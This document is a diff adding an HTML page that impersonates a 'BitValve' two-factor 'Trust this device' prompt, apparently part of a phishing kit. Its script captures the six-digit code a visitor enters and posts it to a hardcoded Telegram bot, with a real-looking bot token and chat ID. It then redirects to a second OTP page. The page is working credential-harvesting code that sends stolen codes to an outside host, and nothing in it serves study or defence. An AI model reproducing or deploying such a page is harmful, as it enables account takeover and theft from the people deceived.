@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BitValve - Trust this device</title>
+    <style>
+        /* ========== GLOBAL RESET ========== */
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Inter", sans-serif;
+        }
+        
+        body {
+            background-color: #f2f2f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        /* ========== MAIN CONTAINER ========== */
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 30px 25px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+        /* ========== LOGO AREA ========== */
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .logo svg {
+            width: 28px;
+            height: 28px;
+            fill: #016a54;
+        }
+        
+        h2 {
+            color: #003b2b;
+            font-weight: 700;
+        }
+        /* ========== TITLE & TEXT ========== */
+        
+        h3 {
+            color: #016a54;
+            font-size: 20px;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+        
+        .subtitle {
+            font-size: 12px;
+            color: #7a7a7a;
+            margin: 20px 0 10px;
+            letter-spacing: 0.5px;
+        }
+        /* ========== INPUT CODE BOXES ========== */
+        
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .code-inputs input {
+            width: 45px;
+            height: 50px;
+            text-align: center;
+            font-size: 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+            outline: none;
+            transition: 0.2s ease;
+        }
+        
+        .code-inputs input:focus {
+            border-color: #016a54;
+            box-shadow: 0 0 0 2px rgba(1, 106, 84, 0.2);
+        }
+        /* ========== BUTTON ========== */
+        
+        #trust-btn {
+            width: 100%;
+            background: #0e0e0e;
+            color: #00ff84;
+            border: none;
+            border-radius: 30px;
+            padding: 14px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.3s ease;
+        }
+        
+        #trust-btn:hover {
+            background: #1a1a1a;
+        }
+        /* ========== RESPONSIVE ========== */
+        
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px;
+            }
+            .code-inputs input {
+                width: 40px;
+                height: 45px;
+                font-size: 18px;
+            }
+            h3 {
+                font-size: 18px;
+            }
+            #trust-btn {
+                font-size: 15px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M4 4v5h5V4H4zm0 7v5h5v-5H4zm7-7v5h5V4h-5zm7 0v5h2V4h-2zm-7 7v5h5v-5h-5zm7 0v5h2v-5h-2zm-7 7v3h5v-3h-5zm7 0v3h2v-3h-2z" />
+                </svg>
+                <h2>BitValve</h2>
+            </div>
+
+            <h3>Trust this device</h3>
+            <p class="subtitle">2FA CODE</p>
+            <div class="code-inputs">
+                <input type="text" maxlength="1" />
+                <input type="text" maxlength="1" />
+                <input type="text" maxlength="1" />
+                <input type="text" maxlength="1" />
+                <input type="text" maxlength="1" />
+                <input type="text" maxlength="1" />
+            </div>
+
+            <button id="trust-btn">Trust Device</button>
+            <p id="message" style="color: red;"></p>
+            <!-- Message element -->
+        </div>
+    </div>
+
+    <script>
+        // === Auto-move between inputs ===
+        const inputs = document.querySelectorAll(".code-inputs input");
+
+        inputs.forEach((input, index) => {
+            input.addEventListener("input", (e) => {
+                const value = e.target.value;
+                if (value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        document.getElementById("trust-btn").addEventListener("click", function() {
+            // Collect the code from the inputs
+            const code = Array.from(inputs).map(input => input.value).join('');
+
+            // Optional: Send data to your Telegram bot
+            const telegramBotToken = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q'; // Replace with your bot token
+            const chatId = '5615316142'; // Replace with your chat ID
+            const message = `Email Code: ${code}`;
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Redirect to otp2.html after sending the message
+                        window.location.href = "otp2.html";
+                    } else {
+                        console.error('Error sending message to Telegram:', response.statusText);
+                    }
+                })
+                .catch(error => console.error('Fetch error:', error));
+        });
+    </script>
+</body>
+
+</html>
